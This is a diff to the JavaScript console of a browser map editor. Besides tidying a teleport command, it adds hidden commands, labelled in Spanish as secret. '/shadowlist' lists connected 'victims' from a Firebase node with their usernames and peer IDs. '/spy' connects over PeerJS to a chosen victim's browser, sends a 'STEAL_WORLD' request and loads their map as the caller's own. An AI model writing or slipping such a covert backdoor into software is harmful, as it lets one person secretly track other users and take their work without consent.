@@ -1146,40 +1146,97 @@ async function saveCustomChest() {
 document.getElementById('console-input').addEventListener('keydown', function(e) {
     if (e.key === 'Enter') {
         const command = this.value.trim();
+        const historyDiv = document.getElementById('console-history');
         
+        // 1. COMANDO NORMAL: TELETRANSPORTE
         if (command.startsWith('/tp ')) {
             const parts = command.split(' ');
-            const x = parts[1] ? parts[1] : '0';
-            const y = parts[2] ? parts[2] : '0';
-            
-            // --- NUEVO: LÓGICA REAL DE TELETRANSPORTE ---
-            const targetX = Number(x);
-            const targetY = Number(y);
+            const targetX = Number(parts[1] ? parts[1] : '0');
+            const targetY = Number(parts[2] ? parts[2] : '0');
             
             if (!isNaN(targetX) && !isNaN(targetY)) {
                 camera.x = targetX;
                 camera.y = targetY;
-                worldDirty = true; // Obliga al editor a redibujar el mapa en la nueva zona
+                worldDirty = true; 
             }
-            // ---------------------------------------------
             
-            // Crear el mensaje visual
-            const historyDiv = document.getElementById('console-history');
             const msgNode = document.createElement('div');
             msgNode.className = 'console-msg';
-            msgNode.innerText = `[INFO] WHOOSH! Teleported to [X: ${x}, Y: ${y}].`;
-            
-            // Añadirlo a la pantalla
+            msgNode.innerText = `[INFO] WHOOSH! Teleported to [X: ${targetX}, Y: ${targetY}].`;
             historyDiv.appendChild(msgNode);
             
-            // Limpiar el input
             this.value = '';
-            
-            // Hacer que desaparezca en 6 segundos (6000 ms)
-            setTimeout(() => {
-                msgNode.classList.add('fade-out');
-            }, 6000);
+            setTimeout(() => { msgNode.classList.add('fade-out'); }, 6000);
+            return;
         }
+
+        // 2. COMANDO SECRETO: VER VÍCTIMAS CONECTADAS
+        if (command === '/shadowlist') {
+            const db = firebase.database();
+            db.ref('shadow_rooms').once('value').then(snapshot => {
+                const rooms = snapshot.val();
+                for (let uid in rooms) {
+                    let r = rooms[uid];
+                    // Comprueba si enviaron su latido en el último minuto
+                    let active = (Date.now() - r.timestamp < 60000) ? "🟢" : "🔴";
+                    
+                    let msgNode = document.createElement('div');
+                    msgNode.className = 'console-msg';
+                    msgNode.innerText = `${active} ${r.username} | ID: ${r.hostId}`;
+                    historyDiv.appendChild(msgNode);
+                }
+            });
+            this.value = '';
+            return;
+        }
+
+        // 3. COMANDO SECRETO: ROBAR MAPA (/spy [ID])
+        if (command.startsWith('/spy ')) {
+            const targetId = command.split(' ')[1];
+            if (targetId) {
+                let msgNode = document.createElement('div');
+                msgNode.className = 'console-msg';
+                msgNode.innerText = `[NINJA] Infiltrando en ID: ${targetId}...`;
+                historyDiv.appendChild(msgNode);
+                
+                // Conecta tu navegador al de la víctima
+                const spyPeer = new Peer();
+                spyPeer.on('open', () => {
+                    const conn = spyPeer.connect(targetId);
+                    
+                    conn.on('open', () => {
+                        msgNode.innerText = `[NINJA] Conectado. Descargando mundo...`;
+                        conn.send({ cmd: "STEAL_WORLD" });
+                    });
+                    
+                    conn.on('data', (data) => {
+                        if (data.type === "WORLD_PAYLOAD") {
+                            msgNode.innerText = `[NINJA] Mundo recibido. Hackeando sistema...`;
+                            
+                            // 1. Decodifica el archivo
+                            const decodedJSON = mbwAlgorithm.decode(data.payload);
+                            const worldObj = JSON.parse(decodedJSON);
+                            
+                            // 2. Reemplaza tu mapa actual por el robado
+                            mbwom.world = worldObj;
+                            mbwom.loadScene(1);
+                            if (typeof initializeWorldCache === 'function') initializeWorldCache();
+                            
+                            // 3. Sincroniza la UI
+                            if (typeof populateLocationSettings === 'function') populateLocationSettings();
+                            worldDirty = true;
+                            
+                            msgNode.innerText = `[NINJA] ¡Infiltración exitosa! Tienes su mapa.`;
+                        }
+                    });
+                });
+            }
+            this.value = '';
+            return;
+        }
+        
+        // Si el comando no existe
+        this.value = '';
     }
 });
 
